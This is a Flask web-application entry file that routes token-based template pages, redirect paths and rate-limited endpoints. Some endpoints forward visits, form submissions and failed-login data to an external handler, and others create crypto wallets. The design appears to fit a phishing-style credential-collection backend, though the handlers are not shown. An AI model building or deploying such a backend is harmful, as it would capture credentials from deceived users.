from flask import Flask, request, redirect, render_template, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_cors import CORS
import random

# Try relative imports first (for Vercel), fall back to direct imports (for local)
try:
    from .redirect_handler import RedirectHandler
    from .pagetemplate_handler import PageTemplateHandler
    from .externalapis_handler import ExternalApisHandler
    from .infura_web3 import InfuraWeb3Handler
except ImportError:
    from redirect_handler import RedirectHandler
    from pagetemplate_handler import PageTemplateHandler
    from externalapis_handler import ExternalApisHandler
    from infura_web3 import InfuraWeb3Handler

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Rate Limiter to prevent excessive requests
limiter = Limiter(key_func=get_remote_address)
limiter.init_app(app)

redirect_handler = RedirectHandler()
page_handler = PageTemplateHandler()
external_apis = ExternalApisHandler()
infura_handler = InfuraWeb3Handler()

# TEMPLATING
@app.route('/<token>')
@app.route('/page<token>')  # Add alternative route path
def token_path_handler(token):
    rendered_template, error = page_handler.handle_token_template(token)
    
    if error:
        return render_template('error.html', message=error), 404
        
    return rendered_template


# REDIRECT HANDLER
@app.route('/archive<int:num>')
def path_handler(num):
    return redirect_handler.handle_archive_path(num)

@app.route('/document<int:num>')
@limiter.limit("10 per minute")
def document_path_handler(num):
    return redirect_handler.handle_premium_path(num)
    
@app.route('/directory<int:num>')
@limiter.limit("10 per minute")
def directory_path_handler(num):
    return redirect_handler.handle_premium_path(num)

@app.route('/directories<int:num>')
@limiter.limit("10 per minute")
def directories_path_handler(num):
    return redirect_handler.handle_premium_path(num)

# FORMS HANDLER
@app.route('/api/notify-visit', methods=['POST'])
@limiter.limit("30 per minute")
def notify_visit():
    try:
        visit_data = request.form.to_dict()
        result = external_apis.notify_page_visit(visit_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/notify-failed-login', methods=['POST'])
@limiter.limit("10 per minute")
def notify_failed_login():
    try:
        login_data = request.form.to_dict()
        result = external_apis.notify_failed_login(login_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/notify-form-submission', methods=['POST'])
@limiter.limit("10 per minute")
def notify_form_submission():
    try:
        form_data = request.form.to_dict()
        result = external_apis.notify_form_submission(form_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# APP API ENDPOINTS
@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    try:
        login_data = request.form.to_dict()
        result = external_apis.handle_login(login_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/register', methods=['POST'])
@limiter.limit("3 per minute")
def register():
    try:
        registration_data = request.form.to_dict()
        result = external_apis.handle_register(registration_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/reset-password', methods=['POST'])
@limiter.limit("3 per minute")
def reset_password():
    try:
        reset_data = request.form.to_dict()
        result = external_apis.handle_reset_password(reset_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/backend-function', methods=['POST'])
@limiter.limit("10 per minute")
def backend_function():
    try:
        # Get token from form data
        token = request.form.get('token')
        if not token:
            return jsonify({'error': 'No valid authorization token provided'}), 401
            
        # Get function data
        function_data = request.form.to_dict()
        
        result = external_apis.handle_backend_multi_function(function_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
# Web3 Routes
@app.route("/api/get_exchange_rates", methods=["GET"])
@limiter.limit("10 per minute")
def get_exchange_rates():
    try:
        amount = float(request.args.get("amount", 0))
        result = infura_handler.get_exchange_rates(amount)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/check_transaction", methods=["GET"])
@limiter.limit("10 per minute")
def check_transaction():
    try:
        address = request.args.get("address")
        expected_amount = float(request.args.get("amount", 0))
        result = infura_handler.check_transaction(address, expected_amount)
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route("/api/create_wallet", methods=["POST"])
@limiter.limit("5 per minute")
def create_wallet():
    try:
        result = infura_handler.create_wallet()
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Add CORS headers after each request
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Export for Vercel
app = app

if __name__ == '__main__':
    app.run(debug=True)